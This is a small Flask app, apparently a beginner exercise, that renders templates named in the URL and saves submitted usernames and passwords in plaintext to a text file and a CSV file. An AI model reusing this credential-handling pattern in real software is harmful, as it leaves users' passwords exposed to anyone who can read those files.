from flask import Flask, render_template,request,redirect
import csv
app = Flask(__name__)


@app.route("/")
def hello_world():
	return render_template("page1.html")

@app.route("/<string:page_name>")
def htmlpage(page_name):
	return render_template(page_name)
def write_text(data):
	with open("database.txt", mode="a+") as database:
		username=data["username"]
		password=data["password"]
		file = database.write(f"\n username:{username},password:{password}")
		database.close()

def write_csv(data):
	with open("database.csv", mode="a+", newline="") as database2:
		username=data["username"]
		password=data["password"]
		csv_writter = csv.writer(database2, delimiter=",",quotechar='"',quoting=csv.QUOTE_MINIMAL)
		csv_writter.writerow([username,password])

@app.route('/submit', methods=['POST', 'GET'])
def submit():
	if request.method == 'POST':
		try:
			data = request.form.to_dict()
			write_csv(data)
			write_text(data)
			return redirect("page1.html")
		except:
			return "couldnt save to database"
	else:
		return "ahhh problemmm"
